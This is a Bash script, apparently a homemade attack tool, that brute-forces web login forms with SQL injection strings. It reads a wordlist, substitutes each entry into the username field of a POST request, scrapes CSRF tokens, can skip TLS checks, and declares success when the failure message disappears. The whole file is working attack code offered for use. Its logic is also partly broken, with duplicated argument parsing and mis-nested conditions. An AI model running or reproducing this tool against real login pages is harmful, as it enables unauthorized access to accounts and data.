#!/bin/bash

# HTTP login page Brute Force with SQL Queries by Sajibu

# Parsing Arguments

while [[ $# -gt 0 && $# -lt 15 ]]; do

  case "$1" in
    -u|--url)
      URL="$2"
      shift # past argument
      shift # past value
      ;;
    -w|--wordlist)
      WORDLIST=$2
      shift # past argument
      shift # past value
      ;;
    -r|--request)
      LOGIN=$2
      shift # past argument
      shift # past value
      ;;
    -H|--header)
      HEADER=$2
      shift # past argument
      shift # past value
      ;;
    -e|--error)
      ERROR=$2
      shift # past argument
      shift # past value
      ;;
    -c|--cookie)
      Cookie=$2
      shift # past argument
      shift # past value
      ;;
    -s|--ssl)
      SSL=$2
      shift # past argument
      shift # past value
      ;;
    -C|--csrf)
      CSRF=$2
      shift # past argument
      shift # past value
      ;;
    -v|--verbose)
      VERBOSE=$1
      shift # past argument
      shift # past value
      ;;          
    -h|--help)
    echo -e "USAGE:\n-u | --url = Supply the login page, for example: -u http://192.168.98.200/login.php\n-w | --wordlist = Wordlist path.\n-r | --request = Request body, for example: -r 'user=FUZZ&password=123' replace injectable string with FUZZ keyword!\n-e | --error = Failed login attempt message, example: -e 'Invalid user or password.'\n-C | --csrf = Bypass CSRF protection. Use example: -C 'true'\n-c | --cookie = Set Cookie, for example: 'wordpress_test_cookie=WP%20Cookie%20check'\n-H | --header = Any header, for example: 'X-Forwarded-For: 10.10.10.10'\n-s | --ssl = No SSL/TLS check. Example: --ssl true\n-v | --verbose = Print header and post response to the screen. Example: -v | --verbose"
      shift # past argument
      exit 1
      ;;
    -*|--*)
      echo "$1 Required one parameter"
      exit 1
      ;;

  esac

done

while [[ $# -gt 0 && $# -lt 15 ]]; do

    case $3 in
    -u|--url)
      URL=$4
      shift # past argument
      shift # past value
      ;;
    -w|--wordlist)
      WORDLIST=$4
      shift # past argument
      shift # past value
      ;;
    -r|--request)
      LOGIN=$4
      shift # past argument
      shift # past value
      ;;
    -c|--cookie)
      Cookie=$4
      shift # past argument
      shift # past value
      ;;      
    -H|--header)
      HEADER=$4
      shift # past argument
      shift # past value
      ;;
    -e|--error)
      ERROR=$4
      shift # past argument
      shift # past value
      ;;
    -s|--ssl)
      SSL=$4
      shift # past argument
      shift # past value
      ;;      
    -C|--csrf)
      CSRF=$4
      shift # past argument
      shift # past value
      ;;
    -v|--verbose)
      VERBOSE=$3
      shift # past argument
      shift # past value
      ;;          
    -*|--*)
      echo "$3 Required one parameter"
      exit 1
      ;;
        
  esac

done

while [[ $# -gt 0 && $# -lt 15 ]]; do

    case $5 in
    -u|--url)
      URL=$6
      shift # past argument
      shift # past value
      ;;
    -w|--wordlist)
      WORDLIST=$6
      shift # past argument
      shift # past value
      ;;
    -r|--request)
      LOGIN=$6
      shift # past argument
      shift # past value
      ;;
    -c|--cookie)
      Cookie=$6
      shift # past argument
      shift # past value
      ;;      
    -H|--header)
      HEADER=$6
      shift # past argument
      shift # past value
      ;;
    -e|--error)
      ERROR=$6
      shift # past argument
      shift # past value
      ;;
    -s|--ssl)
      SSL=$6
      shift # past argument
      shift # past value
      ;; 
    -C|--csrf)
      CSRF=$6
      shift # past argument
      shift # past value
      ;;
    -v|--verbose)
      VERBOSE=$5
      shift # past argument
      shift # past value
      ;;                     
    -*|--*)
      echo "$5 Required one parameter"
      exit 1
      ;;

  esac

done

while [[ $# -gt 0 && $# -lt 15 ]]; do

    case $7 in
    -u|--url)
      URL=$8
      shift # past argument
      shift # past value
      ;;
    -w|--wordlist)
      WORDLIST=$8
      shift # past argument
      shift # past value
      ;;
    -r|--request)
      LOGIN=$8
      shift # past argument
      shift # past value
      ;;
    -H|--header)
      HEADER=$8
      shift # past argument
      shift # past value
      ;;
    -c|--cookie)
      Cookie=$8
      shift # past argument
      shift # past value
      ;;      
    -e|--error)
      ERROR=$8
      shift # past argument
      shift # past value
      ;;
    -s|--ssl)
      SSL=$8
      shift # past argument
      shift # past value
      ;; 
    -C|--csrf)
      CSRF=$8
      shift # past argument
      shift # past value
      ;;
    -v|--verbose)
      VERBOSE=$7
      shift # past argument
      shift # past value
      ;;                     
    -*|--*)
      echo "$7 Required one parameter"
      exit 1
      ;;

  esac

done

while [[ $# -gt 0 && $# -lt 15 ]]; do

    case $9 in
    -u|--url)
      URL=${10}
      shift # past argument
      shift # past value
      ;;
    -w|--wordlist)
      WORDLIST=${10}
      shift # past argument
      shift # past value
      ;;
    -r|--request)
      LOGIN=${10}
      shift # past argument
      shift # past value
      ;;
    -c|--cookie)
      Cookie=${10}
      shift # past argument
      shift # past value
      ;;      
    -H|--header)
      HEADER=${10}
      shift # past argument
      shift # past value
      ;;
    -e|--error)
      ERROR=${10}
      shift # past argument
      shift # past value
      ;;
    -s|--ssl)
      SSL=${10}
      shift # past argument
      shift # past value
      ;;    
    -C|--csrf)
      CSRF=${10}
      shift # past argument
      shift # past value
      ;;
    -v|--verbose)
      VERBOSE=${9}
      shift # past argument
      shift # past value
      ;;                  
    -*|--*)
      echo "$9 Required one parameter"
      exit 1
      ;;

  esac

done

while [[ $# -gt 0 && $# -lt 15 ]]; do

    case ${11} in
    -u|--url)
      URL=${12}
      shift # past argument
      shift # past value
      ;;
    -w|--wordlist)
      WORDLIST=${12}
      shift # past argument
      shift # past value
      ;;
    -r|--request)
      LOGIN=${12}
      shift # past argument
      shift # past value
      ;;
    -c|--cookie)
      cookie=${12}
      shift # past argument
      shift # past value
      ;;      
    -H|--header)
      HEADER=${12}
      shift # past argument
      shift # past value
      ;;
    -e|--error)
      ERROR=${12}
      shift # past argument
      shift # past value
      ;;
    -s|--ssl)
      SSL=${12}
      shift # past argument
      shift # past value
      ;; 
    -C|--csrf)
      CSRF=${12}
      shift # past argument
      shift # past value
      ;;
    -v|--verbose)
      VERBOSE=${11}
      shift # past argument
      shift # past value
      ;;                     
    -*|--*)
      echo "${11} Required one parameter"
      exit 1
      ;;

  esac

done

while [[ $# -gt 0 && $# -lt 15 ]]; do

    case ${12} in
    -u|--url)
      URL=${13}
      shift # past argument
      shift # past value
      ;;
    -w|--wordlist)
      WORDLIST=${13}
      shift # past argument
      shift # past value
      ;;
    -r|--request)
      LOGIN=${13}
      shift # past argument
      shift # past value
      ;;
    -c|--cookie)
      cookie=${13}
      shift # past argument
      shift # past value
      ;;      
    -H|--header)
      HEADER=${13}
      shift # past argument
      shift # past value
      ;;
    -e|--error)
      ERROR=${13}
      shift # past argument
      shift # past value
      ;;
    -s|--ssl)
      SSL=${13}
      shift # past argument
      shift # past value
      ;; 
    -C|--csrf)
      CSRF=${13}
      shift # past argument
      shift # past value
      ;;
    -v|--verbose)
      VERBOSE=${12}
      shift # past argument
      shift # past value
      ;;                     
    -*|--*)
      echo "${12} Required one parameter"
      exit 1
      ;;

  esac

done

while [[ $# -gt 0 && $# -lt 15 ]]; do

    case ${14} in
    -u|--url)
      URL=${15}
      shift # past argument
      shift # past value
      ;;
    -w|--wordlist)
      WORDLIST=${15}
      shift # past argument
      shift # past value
      ;;
    -r|--request)
      LOGIN=${15}
      shift # past argument
      shift # past value
      ;;
    -c|--cookie)
      cookie=${15}
      shift # past argument
      shift # past value
      ;;      
    -H|--header)
      HEADER=${15}
      shift # past argument
      shift # past value
      ;;
    -e|--error)
      ERROR=${15}
      shift # past argument
      shift # past value
      ;;
    -s|--ssl)
      SSL=${15}
      shift # past argument
      shift # past value
      ;; 
    -C|--csrf)
      CSRF=${15}
      shift # past argument
      shift # past value
      ;;
    -v|--verbose)
      VERBOSE=${14}
      shift # past argument
      shift # past value
      ;;                     
    -*|--*)
      echo "${14} Required one parameter"
      exit 1
      ;;

  esac

done

# Arguments check

if [[ "$URL" == '' ]]; then

  echo "[-] URL is not specified, use -u or --url."
  
  exit

  if [[ "$LOGIN" == '' ]]; then

    echo "[-] Request body is not specified, use -r|--request."
    
    exit

  fi

  if [[ "$ERROR" == '' ]]; then

    echo "[-] Error message - Error response message isn't specified, use -e or --error."
    
    exit

  fi

  if [[ "$WORDLIST" == '' ]]; then

    echo "[-] Path for SQL injection dictionary queries isn't specified, use -w or --wordlist."
        echo "[-] Please use single quotes and type -h or --help for usage."
    
    exit

  fi

fi

if [[ "$LOGIN" == '' ]]; then

  echo "[-] Request body is not specified, use -r|--request."
  
  exit

  if [[ "$ERROR" == '' ]]; then

    echo "[-] Error message - Error response message isn't specified, use -e or --error."
    
    exit

  fi

  if [[ "$WORDLIST" == '' ]]; then

    echo "[-] Path for SQL injection dictionary queries isn't specified, use -w or --wordlist."
    
    exit

  fi
    
fi

  
if [[ "$ERROR" == '' ]]; then

  echo "[-] Error message - Error response message isn't specified, use -e or --error."
  
  exit

  if [[ "$WORDLIST" == '' ]]; then

    echo "[-] Path for SQL injection dictionary queries isn't specified, use -w or --wordlist."
    
    exit

  fi  
    
fi
    
if [[ "$WORDLIST" == '' ]]; then

  echo "[-] Path for SQL injection dictionary queries isn't specified, use -w or --wordlist."

  exit  

fi

if [[ "$SSL" != '' ]] && [[ "$SSL" != 'true' ]];then

  echo "-s / --ssl must be set to true!"
  
  exit

fi

function verbose(){

    #Header is set with different arguements check

    if [ "$HEADER" != '' ] && [ "$Cookie" == '' ] && [ "$CSRF" == '' ] && [ "$SSL" != 'true' ]; then
      
      REQUEST=$(curl -s -v -s "${URL}" -H "${HEADER}"  --data-raw "${LOGIN/FUZZ/$wordlist}")
      echo "$REQUEST"

      if [ "$HEADER" != '' ] && [ "$Cookie" != '' ] && [ "$CSRF" == '' ] && [ "$SSL" != 'true' ]; then
        
        REQUEST=$(curl -s -v -s "${URL}" --cookie "${Cookie}" -H "${HEADER}" --data-raw "${LOGIN/FUZZ/$wordlist}")
        echo "$REQUEST"

      elif [ "$HEADER" != '' ] && [ "$Cookie" != '' ] && [ "$CSRF" != '' ] && [ "$SSL" != 'true' ]; then
        
        CSRF_Name=$(curl -s "$URL" | grep -o -P '(?<=csrf).*(?=" value)')
        
        CSRF_REQ=$(curl -s -c "cookies.txt" -d "$LOGIN" "${URL}" | grep -o -P '(?<=csrf).*(?=")' | grep -i -o -P '(?<=value=").*(?=)')
        
        REQUEST=$(curl -v -s -b "cookies.txt" "${URL}" -H ${HEADER} --cookie ${Cookie} --cookie ${CSRF_REQ} --data-raw "${LOGIN/FUZZ/$wordlist}" -d "csrf$CSRF_Name=$CSRF_REQ" --header "X-CSRFToken: {$CSRF_REQ}")
        echo "$REQUEST"

      elif [ "$HEADER" != '' ] && [ "$Cookie" != '' ] && [ "$CSRF" != '' ] && [ "$SSL" == 'true' ]; then
        
        CSRF_Name=$(curl -s "$URL" | grep -o -P '(?<=csrf).*(?=" value)')
        
        CSRF_REQ=$(curl -s -c "cookies.txt" -d "$LOGIN" "${URL}" | grep -o -P '(?<=csrf).*(?=")' | grep -i -o -P '(?<=value=").*(?=)')
        
        REQUEST=$(curl -v -s -b -k "cookies.txt" "${URL}" --cookie ${Cookie} --cookie ${CSRF_REQ} -H ${HEADER} --data-raw "${LOGIN/FUZZ/$wordlist}" -d "csrf$CSRF_Name=$CSRF_REQ" --header "X-CSRFToken: {$CSRF_REQ}")
        echo "$REQUEST"

      elif [ "$HEADER" != '' ] && [ "$Cookie" == '' ] && [ "$CSRF" == '' ] && [ "$SSL" != 'true' ]; then
        
        REQUEST=$(curl -s -k -v 2>/tmp/curl-temp.txt -s "${URL}" -H "${HEADER}" --data-raw "${LOGIN/FUZZ/$wordlist}")
        echo "$REQUEST"

      elif [ "$HEADER" != '' ] && [ "$Cookie" == '' ] && [ "$CSRF" != '' ] && [ "$SSL" != 'true' ]; then
        
        CSRF_Name=$(curl -s "$URL" | grep -o -P '(?<=csrf).*(?=" value)')
        
        CSRF_REQ=$(curl -s -c "cookies.txt" -d "$LOGIN" "${URL}" | grep -o -P '(?<=csrf).*(?=")' | grep -i -o -P '(?<=value=").*(?=)')
        
        REQUEST=$(curl -v -s -b "cookies.txt" "${URL}" -H ${HEADER} --cookie ${CSRF_REQ} --data-raw "${LOGIN/FUZZ/$wordlist}" -d "csrf$CSRF_Name=$CSRF_REQ" --header "X-CSRFToken: {$CSRF_REQ}")
        echo "$REQUEST"

      fi

    # Cookie is set with other arguments

    elif [ "$HEADER" == '' ] && [ "$Cookie" != '' ] && [ "$CSRF" == '' ] && [ "$SSL" != 'true' ]; then
      
      REQUEST=$(curl -s -v -s "${URL}" --cookie "${Cookie}" -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0' --data-raw "${LOGIN/FUZZ/$wordlist}")
      echo "$REQUEST"

      if [ "$HEADER" == '' ] && [ "$Cookie" != '' ] && [ "$CSRF" != '' ] && [ "$SSL" != 'true' ]; then
        
        CSRF_Name=$(curl -s "$URL" | grep -o -P '(?<=csrf).*(?=" value)')
        
        CSRF_REQ=$(curl -s -c "cookies.txt" -d "$LOGIN" "${URL}" | grep -o -P '(?<=csrf).*(?=")' | grep -i -o -P '(?<=value=").*(?=)')
        
        REQUEST=$(curl -v -s -b "cookies.txt" "${URL}" --cookie ${Cookie} --cookie ${CSRF_REQ} --data-raw "${LOGIN/FUZZ/$wordlist}" -d "csrf$CSRF_Name=$CSRF_REQ" --header "X-CSRFToken: {$CSRF_REQ}")
        echo "$REQUEST"

      elif [ "$HEADER" == '' ] && [ "$Cookie" != '' ] && [ "$CSRF" != '' ] && [ "$SSL" == 'true' ]; then
        
        CSRF_Name=$(curl -s "$URL" | grep -o -P '(?<=csrf).*(?=" value)')
        
        CSRF_REQ=$(curl -s -c "cookies.txt" -d "$LOGIN" "${URL}" | grep -o -P '(?<=csrf).*(?=")' | grep -i -o -P '(?<=value=").*(?=)')
        
        REQUEST=$(curl -v -s -k -b "cookies.txt" "${URL}" --cookie ${Cookie} --cookie ${CSRF_REQ} --data-raw "${LOGIN/FUZZ/$wordlist}" -d "csrf$CSRF_Name=$CSRF_REQ" --header "X-CSRFToken: {$CSRF_REQ}")
        echo "$REQUEST"

      fi

    elif [ "$HEADER" == '' ] && [ "$Cookie" != '' ] && [ "$CSRF" == '' ] && [ "$SSL" == 'true' ]; then
      
      REQUEST=$(curl -s -k -v -s "${URL}" --cookie "${Cookie}" -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0' --data-raw "${LOGIN/FUZZ/$wordlist}")      
      echo "$REQUEST"

    # CSRF is true with other arguments

    elif [ "$HEADER" == '' ] && [ "$Cookie" == '' ] && [ "$CSRF" != '' ] && [ "$SSL" != 'true' ]; then
        
        CSRF_Name=$(curl -s "$URL" | grep -o -P '(?<=csrf).*(?=" value)')
        
        CSRF_REQ=$(curl -s -c "cookies.txt" -d "$LOGIN" "${URL}" | grep -o -P '(?<=csrf).*(?=")' | grep -i -o -P '(?<=value=").*(?=)')
        
        REQUEST=$(curl -v -s -b "cookies.txt" "${URL}" --cookie ${CSRF_REQ} --data-raw "${LOGIN/FUZZ/$wordlist}" -d "csrf$CSRF_Name=$CSRF_REQ" --header "X-CSRFToken: {$CSRF_REQ}" --header "X-CSRFToken: {$CSRF_REQ}")
        echo "$REQUEST"

      if [ "$HEADER" == '' ] && [ "$Cookie" == '' ] && [ "$CSRF" != '' ] && [ "$SSL" == 'true' ]; then
        
        CSRF_Name=$(curl -s "$URL" | grep -o -P '(?<=csrf).*(?=" value)')
        
        CSRF_REQ=$(curl -s -c "cookies.txt" -d "$LOGIN" "${URL}" | grep -o -P '(?<=csrf).*(?=")' | grep -i -o -P '(?<=value=").*(?=)')
        
        REQUEST=$(curl -v -s -k -b "cookies.txt" "${URL}" --cookie ${CSRF_REQ} --data-raw "${LOGIN/FUZZ/$wordlist}" -d "csrf$CSRF_Name=$CSRF_REQ" --header "X-CSRFToken: {$CSRF_REQ}")
        echo "$REQUEST"

      fi

    # Only SSL is TRUE

    elif [ "$HEADER" == '' ] && [ "$Cookie" == '' ] && [ "$CSRF" == '' ] && [ "$SSL" != 'true' ]; then
      
      REQUEST=$(curl -v -s -k "${URL}" -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0' --data-raw "${LOGIN/FUZZ/$wordlist}")
      echo "$REQUEST"

    else

      REQUEST=$(curl -v -s "${URL}" -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0' --data-raw "${LOGIN/FUZZ/$wordlist}")
      echo "$REQUEST"   
  fi

}

# Variables

PASS="test"
wordlist=${WORDLIST}

# Counter
i=0

# Main loop 
while read -r wordlist; do
    
    # Increase counter
    ((i=i+1))

    # Feedback for user
    echo "[-] Try ${i}: ${wordlist}"

    # Connect to server

    if [[ $VERBOSE == '-v' ]]; then
      
      verbose

    fi

    #Header is set with different arguements check

    if [ "$HEADER" != '' ] && [ "$Cookie" == '' ] && [ "$CSRF" == '' ] && [ "$SSL" != 'true' ]; then
      
      REQUEST=$(curl -s -v 2>/tmp/curl-temp.txt -s "${URL}" -H "${HEADER}"  --data-raw "${LOGIN/FUZZ/$wordlist}")

      if [ "$HEADER" != '' ] && [ "$Cookie" != '' ] && [ "$CSRF" == '' ] && [ "$SSL" != 'true' ]; then
        
        REQUEST=$(curl -s -v 2>/tmp/curl-temp.txt -s "${URL}" --cookie "${Cookie}" -H "${HEADER}" --data-raw "${LOGIN/FUZZ/$wordlist}")

      elif [ "$HEADER" != '' ] && [ "$Cookie" != '' ] && [ "$CSRF" != '' ] && [ "$SSL" != 'true' ]; then
        
        CSRF_Name=$(curl -s "$URL" | grep -o -P '(?<=csrf).*(?=" value)')
        
        CSRF_REQ=$(curl -s -c "cookies.txt" -d "$LOGIN" "${URL}" | grep -o -P '(?<=csrf).*(?=")' | grep -i -o -P '(?<=value=").*(?=)')
        
        REQUEST=$(curl -v 2>/tmp/curl-temp.txt -s -b "cookies.txt" "${URL}" -H ${HEADER} --cookie ${Cookie} --cookie ${CSRF_REQ} --data-raw "${LOGIN/FUZZ/$wordlist}" -d "csrf$CSRF_Name=$CSRF_REQ" --header "X-CSRFToken: {$CSRF_REQ}")

      elif [ "$HEADER" != '' ] && [ "$Cookie" != '' ] && [ "$CSRF" != '' ] && [ "$SSL" == 'true' ]; then
        
        CSRF_Name=$(curl -s "$URL" | grep -o -P '(?<=csrf).*(?=" value)')
        
        CSRF_REQ=$(curl -s -c "cookies.txt" -d "$LOGIN" "${URL}" | grep -o -P '(?<=csrf).*(?=")' | grep -i -o -P '(?<=value=").*(?=)')
        
        REQUEST=$(curl -v 2>/tmp/curl-temp.txt -s -b -k "cookies.txt" "${URL}" --cookie ${Cookie} --cookie ${CSRF_REQ} -H ${HEADER} --data-raw "${LOGIN/FUZZ/$wordlist}" -d "csrf$CSRF_Name=$CSRF_REQ" --header "X-CSRFToken: {$CSRF_REQ}")

      elif [ "$HEADER" != '' ] && [ "$Cookie" == '' ] && [ "$CSRF" == '' ] && [ "$SSL" != 'true' ]; then
        
        REQUEST=$(curl -s -k -v 2>/tmp/curl-temp.txt -s "${URL}" -H "${HEADER}" --data-raw "${LOGIN/FUZZ/$wordlist}")

      elif [ "$HEADER" != '' ] && [ "$Cookie" == '' ] && [ "$CSRF" != '' ] && [ "$SSL" != 'true' ]; then
        
        CSRF_Name=$(curl -s "$URL" | grep -o -P '(?<=csrf).*(?=" value)')
        
        CSRF_REQ=$(curl -s -c "cookies.txt" -d "$LOGIN" "${URL}" | grep -o -P '(?<=csrf).*(?=")' | grep -i -o -P '(?<=value=").*(?=)')
        
        REQUEST=$(curl -v 2>/tmp/curl-temp.txt -s -b "cookies.txt" "${URL}" -H ${HEADER} --cookie ${CSRF_REQ} --data-raw "${LOGIN/FUZZ/$wordlist}" -d "csrf$CSRF_Name=$CSRF_REQ" --header "X-CSRFToken: {$CSRF_REQ}")
      
      fi

    # Cookie is set with other arguments

    elif [ "$HEADER" == '' ] && [ "$Cookie" != '' ] && [ "$CSRF" == '' ] && [ "$SSL" != 'true' ]; then
      
      REQUEST=$(curl -s -v 2>/tmp/curl-temp.txt -s "${URL}" --cookie "${Cookie}" -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0' --data-raw "${LOGIN/FUZZ/$wordlist}")

      if [ "$HEADER" == '' ] && [ "$Cookie" != '' ] && [ "$CSRF" != '' ] && [ "$SSL" != 'true' ]; then
        
        CSRF_Name=$(curl -s "$URL" | grep -o -P '(?<=csrf).*(?=" value)')
        
        CSRF_REQ=$(curl -s -c "cookies.txt" -d "$LOGIN" "${URL}" | grep -o -P '(?<=csrf).*(?=")' | grep -i -o -P '(?<=value=").*(?=)')
        
        REQUEST=$(curl -v 2>/tmp/curl-temp.txt -s -b "cookies.txt" "${URL}" --cookie ${Cookie} --cookie ${CSRF_REQ} --data-raw "${LOGIN/FUZZ/$wordlist}" -d "csrf$CSRF_Name=$CSRF_REQ" --header "X-CSRFToken: {$CSRF_REQ}")

      elif [ "$HEADER" == '' ] && [ "$Cookie" != '' ] && [ "$CSRF" != '' ] && [ "$SSL" == 'true' ]; then
        
        CSRF_Name=$(curl -s "$URL" | grep -o -P '(?<=csrf).*(?=" value)')
        
        CSRF_REQ=$(curl -s -c "cookies.txt" -d "$LOGIN" "${URL}" | grep -o -P '(?<=csrf).*(?=")' | grep -i -o -P '(?<=value=").*(?=)')
        
        REQUEST=$(curl -v 2>/tmp/curl-temp.txt -s -k -b "cookies.txt" "${URL}" --cookie ${Cookie} --cookie ${CSRF_REQ} --data-raw "${LOGIN/FUZZ/$wordlist}" -d "csrf$CSRF_Name=$CSRF_REQ" --header "X-CSRFToken: {$CSRF_REQ}")
      
    elif [ "$HEADER" == '' ] && [ "$Cookie" != '' ] && [ "$CSRF" == '' ] && [ "$SSL" == 'true' ]; then
      
      REQUEST=$(curl -s -k -v 2>/tmp/curl-temp.txt -s "${URL}" --cookie "${Cookie}" -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0' --data-raw "${LOGIN/FUZZ/$wordlist}")      

    fi

    # CSRF is true with other arguments

    elif [ "$HEADER" == '' ] && [ "$Cookie" == '' ] && [ "$CSRF" != '' ] && [ "$SSL" != 'true' ]; then
        
        CSRF_Name=$(curl -s "$URL" | grep -o -P '(?<=csrf).*(?=" value)')
        
        CSRF_REQ=$(curl -s -c "cookies.txt" -d "$LOGIN" "${URL}" | grep -o -P '(?<=csrf).*(?=")' | grep -i -o -P '(?<=value=").*(?=)')
        
        REQUEST=$(curl -v 2>/tmp/curl-temp.txt -s -b "cookies.txt" "${URL}" --cookie ${CSRF_REQ} --data-raw "${LOGIN/FUZZ/$wordlist}" -d "csrf$CSRF_Name=$CSRF_REQ" --header "X-CSRFToken: {$CSRF_REQ}" --header "X-CSRFToken: {$CSRF_REQ}")
        #echo "$REQUEST"


      if [ "$HEADER" == '' ] && [ "$Cookie" == '' ] && [ "$CSRF" != '' ] && [ "$SSL" == 'true' ]; then
        
        CSRF_Name=$(curl -s "$URL" | grep -o -P '(?<=csrf).*(?=" value)')
        
        CSRF_REQ=$(curl -s -c "cookies.txt" -d "$LOGIN" "${URL}" | grep -o -P '(?<=csrf).*(?=")' | grep -i -o -P '(?<=value=").*(?=)')
        
        REQUEST=$(curl -v 2>/tmp/curl-temp.txt -s -k -b "cookies.txt" "${URL}" --cookie ${CSRF_REQ} --data-raw "${LOGIN/FUZZ/$wordlist}" -d "csrf$CSRF_Name=$CSRF_REQ" --header "X-CSRFToken: {$CSRF_REQ}")
      
      fi

    # Only SSL is TRUE

    elif [ "$HEADER" == '' ] && [ "$Cookie" == '' ] && [ "$CSRF" == '' ] && [ "$SSL" != 'true' ]; then
      
      REQUEST=$(curl -v 2>/tmp/curl-temp.txt -s -k "${URL}" -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0' --data-raw "${LOGIN/FUZZ/$wordlist}")

    else

      REQUEST=$(curl -v 2>/tmp/curl-temp.txt -s "${URL}" -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0' --data-raw "${LOGIN/FUZZ/$wordlist}")

  fi


  # Response check
  final_request=$(echo $REQUEST)
  status_code=`cat /tmp/curl-temp.txt | grep "200 OK"`
  

  if [[ $VERBOSE == '-v' ]] && [[ "$final_request" != *"$ERROR"* ]] && [[ $final_request == *"200 OK"* ]];then
    
    # Success!
    echo -e "[*] Injection worked!"
    echo "[*] SQL Query in Username field is: ${wordlist}"
    printf "[*] If you're seen this message after the first try, please double check the failed login attempt message \n    or if CSRF protection is on to avoid false postive!\n"
    break 2

  elif [[ "$final_request" != *"$ERROR"* ]] && [[ "$status_code" == *"200 OK"* ]] && [[ $VERBOSE == '' ]]; then

    # Success!
    echo -e "[*] Injection worked!"
    echo "[*] SQL Query in Username field is: ${wordlist}"
    printf "[*] If you're seen this message after the first try, please double check the failed login attempt message \n    or if CSRF protection is on to avoid false postive!\n"
    break 2

  elif [[ "$status_code" != *"200 OK"* ]]; then
    echo "Server didn't respond with 200 code!"
    echo "Please check the URL!"
    echo $final_request
    exit

  fi

done < ${wordlist}
